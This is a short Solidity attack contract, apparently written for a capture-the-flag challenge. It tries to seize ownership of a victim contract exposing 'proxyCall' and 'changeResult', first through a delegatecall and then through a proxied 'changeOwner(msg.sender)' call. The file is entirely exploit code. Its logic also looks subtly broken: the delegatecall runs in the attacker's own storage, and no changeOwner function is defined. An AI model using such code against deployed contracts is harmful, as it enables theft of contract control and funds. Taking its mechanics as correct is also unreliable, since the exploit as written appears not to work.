pragma solidity ^0.8.0;

interface ID31eg4t3 {
    function proxyCall(bytes calldata data) external returns (address);
    function changeResult() external;
}

contract Attack {
    address internal immutable victim;

    constructor(address addr) payable {
        victim = addr;
    }

    function exploit() external {
        // Prepare data for delegatecall
        bytes memory data = abi.encodeWithSignature("changeResult()");

        // Perform delegatecall to the victim contract
        (bool success, ) = victim.delegatecall(data);
        require(success, "Delegatecall failed");

        // Change owner of the victim contract to the attacker's address
        ID31eg4t3(victim).proxyCall(abi.encodeWithSignature("changeOwner(address)", msg.sender));
    }
}
